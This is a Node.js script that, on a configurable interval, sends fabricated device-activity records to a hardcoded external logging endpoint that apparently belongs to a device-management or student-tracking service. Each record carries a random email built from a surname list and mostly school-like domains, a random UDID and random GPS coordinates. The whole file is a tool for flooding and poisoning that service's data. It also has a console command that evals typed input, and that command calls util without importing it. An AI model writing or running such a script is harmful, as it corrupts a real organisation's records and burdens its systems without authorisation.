const fetch=require('node-fetch'),
	fs=require('fs'),
	rl=require('serverline');
var config=JSON.parse(fs.readFileSync('config.json','utf8')), // config with our set interval
	url='https://devices.lsmdm.com/log/activity', // url to make POST request to
	genInfo=(()=>{ // function for stuff
		var info={email:'', udid:'', gps:[]}, // base info
			names=["lockyer","loder","lodge","loftes","loftis","loftus","logan","logan-ellis","logie","logwood","lole","lomax","long","longden","longfield","longford","longhurst","longley","longmuir","longsdall","longstaff","longton","lonsdale","loomis","looper","lord","lorimer","loud","loughrin","louise","lourie","love","lovejoy","lovelace","loveless","lovell","lovemore","loveridge","lovett","loving","low","lowe","lowe","lower","lowery","lowis","lowrie","lowson","lowther","loyd","lubert","lucas","lucy","ludlam","ludlow","ludvinka","ludwig","lufkin","luker","lukin","lulham","lumb","lumsden","lund","lunn","lunt","lupo","lupton","luptonn","lura","luscombe","lussenhoff","luthur","luty","lydia","lyle","lyman","lynch","lyndley","lynes","lynn","lynsey","lyon","lyons","lyster","lytle","m","maberley","macalister","macallister","macalpine","macansh","macarthur","macaulay","macdonald","mace","macewan","macfarlane","macfie","macfle","macgibbon","machell","machen","macintosh","mack","mackay","mackenzie","mackereth","mackie","mackillop","mackinnon","mackley","mackreth","mackulay","maclane","maclaren","maclean","macleod","macmillan","macnab","macneece","macneil","macpherson","macvicar","madden","maddock","maddocks","maddox","maden","madin","maetzold","magill","maguire","mahan","mahar","mahatry","maher","mahers","mahon","maile","maines","mainprize","mainstone","mair","mais","maitland","major","makins","makinson","malbis","malcolm","malcolson","malden","malkin","mallett","mallinson","mallison","mallock","malmgren","malpas","maltby","maltman","manderson","mangham","mangles","manini","manley","manly","mann","manners","manning","manser","mansere","mansergh","mansfield","manson","mapowder","marbury","march","marchbanks","marfleet","margaret","margetts","maria/tompson","mariae","marian/langhom","marion","mariss","marjasson","marjorie","markham","marks","marksbury","marland","marler","marlerormartin","marley","marling","marnie","marnontov","marquet","marquis","marquiston","marr","marriage","marriner","marryatt","marsden","marsh","marshall","marten","martha","marthwaite","martin","martindale","martine","martinson","marwood","mary","maryann","mascy","mashiter","mason","massengill","massey","master","masterton","mather","matheson","mathews","mathias","mathieson","mathis","mathison","matlack","matthew","matthews","matthewson","mattick","mattinson","mattison","mattocks","matts","maud","maude","maudesley","maudson","maurice","mautin","maw","maw`","mawley","mawson","maxey","maxwell","may","mayall","mayer","mayes","mayler","mayman","maynard","mayne","maynell","mayoh","mayor","mba","mccutcheon","mckinnon","mcpherson","mcallan","mcallister","mcalpine","mcandress","mcara","mcarthur","mcauley","mcauslan","mcbeath","mcbride","mcburney","mccaffery","mccall","mccallum","mccandless","mccarran","mccarrell","mccarthy","mccarty","mccaulie","mcclanahan","mcclatchie","mcclellen","mccloy","mcclung","mcclure","mccluskie","mcclutcheon","mccolm","mccomb","mcconchie","mcconnell","mccord","mccormack","mccormick","mccorquodale","mccourty","mccowan","mccracken","mccrae","mccrary","mccreight","mccrone","mccubbin","mccullagh","mcculloch","mccullough","mccully","mccune","mccutcheon","mcdaniel","mcdermott","mcdiarmid","mcdivitt","mcdonald","mcdougal","mcdougall","mcdowall","mcdowell","mceachern","mceon","mcevoy","mcewan","mcewen","mcfall","mcfarlane","mcfarlin","mcgarry","mcgarvey","mcgee","mcgehee","mcgeorge","mcgettigan","mcghee","mcgibbon","mcgill","mcglasson","mcglynn","mcgovern","mcgowan","mcgrail","mcgregor","mcgrew","mcguffie","mcguiness","mcguire","mcguishen","mchattie","mcholm","mchughorjames","mcintosh","mcintyre","mciveen","mciver","mckay","mckeachie","mckean","mckeand","mckechnie","mckellar","mckenna","mckenney","mckenzie","mckereth","mckerien","mckerlie","mckernon","mckerral","mckichan","mckie","mckinlay","mckinley","mckinnel","mckinney","mckinnon","mckissick","mckitrick","mcknight","mckone","mckoun","mckune","mclachlan","mclain","mclaren","mclauchlin","mclaughlin","mclaws","mclean","mclearey","mclellan","mclendon","mcleod","mclevin","mcluckie","mcmahon","mcmally","mcmeckan","mcmicken","mcmillan","mcmillian","mcminn","mcmonies","mcmorine","mcmorran","mcmullen","mcmurdo","mcmurray","mcmurtrie","mcnabb","mcnair","mcnamara","mcnee","mcneil","mcnicol","mcnicoll","mcnorgan","mcnulty","mcnutt","mcphail","mcpherson","mcphureson","mcquade","mcqueen","mcquillian","mcrae","mcrobbie","mcrobert","mcroberts","mcruar","mcshane","mctaggart","mcturk","mcvae","mcveigh","mcvey","mcvittie","mcwhirter","mcwhorter","mcwilliam"], // list of names before @ in email
			domains=["gmail.com","fortnite.edu","titaniumnetwork.org","outlook.com","alamedaclc.org","berkeleyschools.net","msjhs.org","k12.ca.us","k12.wi.us","haywardhigh.net","granadahigh.com","conleycaraballo.com","newarkunified.org"];
		info.udid='xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g,(c)=>{var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);return v.toString(16)}); // random udid
		info.email=names[Math.floor(Math.random()*names.length)]+'@'+domains[Math.floor(Math.random()*domains.length)]; // random email from array 
		info.gps=[(Math.random() * (180 - -180) + -180).toFixed(3)*1,(Math.random() * (180 - -180) + -180).toFixed(3)*1]; // random gps info with math.random
		return info; // return our cool array
	});

setInterval(async()=>{
	var data=genInfo(),body="info[platform]=chromeTracker&info[email]="+data['email']+"&info[udid]="+data['udid']+"&info[gps]=["+data['gps']+"]&info[phrases]=1",
		res=await fetch(url, { method: 'POST', body: body, headers: {'content-type':'application/x-www-form-urlencoded'} });
	console.log(`STATUS: ${res.status}, UDID: ${data['udid']}, BODY: ${body}`);
},config.interval); // repeat every something milliseconds as defined in config

rl.init(); // initalize good commandline thing
rl.setPrompt('> '); // kinky >
rl.on('line', function(line) {
	var args=line.split(' '), // arguments for commands
		mts=line.substr(args[0].length+1,128); // command stuffs
	switch(args[0]){
		case'run': // debugging
			try{console.log(util.format(eval(mts)))}
			catch(err){console.log(util.format(err))};
			break
		case'stop':case'exit': // quick escape
			process.exit(0); // when isp go mad
			break
		default:
			if(!args[0])return; // if slap enter key
			console.log(`app: ${args[0]}: command not found`);
			break
	}
});
rl.on('SIGINT',(rl)=>process.exit(0)); // ctrl+c quick exit